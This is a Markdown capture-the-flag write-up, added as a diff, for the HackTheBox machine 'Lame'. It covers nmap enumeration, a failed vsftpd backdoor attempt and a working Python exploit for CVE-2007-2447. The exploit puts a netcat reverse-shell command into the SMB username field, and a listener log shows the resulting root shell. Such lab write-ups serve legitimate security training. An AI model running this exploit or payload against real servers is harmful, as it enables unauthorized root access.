@@ -1,0 +1,182 @@
+---
+title: 'HackTheBox Lame'
+description: 'Linux machine walkthrough from enumeration to privilege escalation.'
+icon: 'shield-halved'
+---
+
+# Enumeration
+
+## Run Nmap Scan
+
+```bash
+nmap 10.10.10.3 -p- -sC -sV --min-rate 6000 -Pn -n -oA tcpDetailed
+
+"
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-09 15:17 BST
+Nmap scan report for 10.10.10.3
+Host is up (0.19s latency).
+Not shown: 65531 filtered tcp ports (no-response)
+PORT    STATE SERVICE    VERSION
+21/tcp  open  tcpwrapped
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.10
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp  open  tcpwrapped
+| ssh-hostkey: 
+|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
+|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
+139/tcp open  tcpwrapped
+445/tcp open  tcpwrapped Samba smbd 3.0.20-Debian
+
+Host script results:
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 2h00m58s, deviation: 2h49m45s, median: 56s
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2023-09-09T10:19:16-04:00
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 115.75 seconds
+"
+```
+
+## Check Vulnerability in FTP (Port 21)
+
+```bash
+searchsploit vsftpd 2.3.4
+
+"
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution                                                                                           | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                              | unix/remote/17491.rb
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+"
+```
+
+## Copy and execute vsftpd 2.3.4 exploit
+
+```bash
+cp /usr/share/exploitdb/exploits/unix/remote/49757.py vsftpd-exploit.py
+```
+
+```bash
+python vsftpd-exploit.py 10.10.10.3
+
+`
+Traceback (most recent call last):
+  File "/home/htb-daeisbae/vsftpd-exploit.py", line 37, in <module>
+    tn2=Telnet(host, 6200)
+  File "/usr/lib/python3.9/telnetlib.py", line 218, in __init__
+    self.open(host, port, timeout)
+  File "/usr/lib/python3.9/telnetlib.py", line 235, in open
+    self.sock = socket.create_connection((host, port), timeout)
+  File "/usr/lib/python3.9/socket.py", line 843, in create_connection
+    raise err
+  File "/usr/lib/python3.9/socket.py", line 831, in create_connection
+    sock.connect(sa)
+TimeoutError: [Errno 110] Connection timed out
+`
+```
+
+It failed, I guess the vulnerability was patched.
+
+## Check Vulnerability in SMB
+
+```bash
+searchsploit samba 3.0.20
+
+"
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+Samba 3.0.10 < 3.3.5 - Format String / Securi | multiple/remote/10095.txt
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map scr | unix/remote/16320.rb
+Samba < 3.0.20 - Remote Heap Overflow         | linux/remote/7701.txt
+Samba < 3.6.2 (x86) - Denial of Service (PoC) | linux_x86/dos/36741.py
+---------------------------------------------- ---------------------------------
+Shellcodes: No Results
+"
+```
+
+Looks like the 2nd script is for us! Since the 2nd script is for metasploit, let’s look for other github exploit
+
+# Exploitation
+
+## Finding Exploits (CVE-2007-2447)
+
+I’ve found a working exploit from [here](https://github.com/0xConstant/CVE-2007-2447) (with some modifications)
+
+```python
+import sys
+from smb.SMBConnection import SMBConnection
+
+if len(sys.argv) != 5:
+    print("* CVE-2007-2447 | Samba 3.0.20 < 3.0.25rc 'Username' map script' Command Execution *\n")
+    print("Usage: python3 exploit.py <rhost> <rport> <lhost> <lport>")
+    print("Example: python3 exploit.py 10.10.10.10 139 127.0.0.1 4444")
+    sys.exit()
+
+rhost = sys.argv[1]
+rport = sys.argv[2]
+lhost = sys.argv[3]
+lport = sys.argv[4]
+
+username = f"/=`nohup nc -e /bin/bash {lhost} {lport}`"
+conn = SMBConnection(username=username, password='', my_name='', remote_name='')
+
+try:
+    print("[...] Sending payload")
+    conn.connect(rhost, rport, timeout=10)
+except Exception as e:
+    print("[ + ] You should be getting a shell now.")
+    sys.exit(e)
+```
+
+## Turn on reverse shell and Exploit
+
+```bash
+nc -lnvp 4444
+
+`
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.10.3.
+Ncat: Connection from 10.10.10.3:42307.
+whoami
+root
+python -c 'import pty;pty.spawn("/bin/bash")'
+root@lame:/# find / -name user.txt
+find / -name user.txt
+/home/makis/user.txt
+root@lame:/# find / -name root.txt
+find / -name root.txt
+/root/root.txt
+`
+```
+
+```bash
+python exploit.py 10.10.10.3 445 10.10.14.10 4444
+```
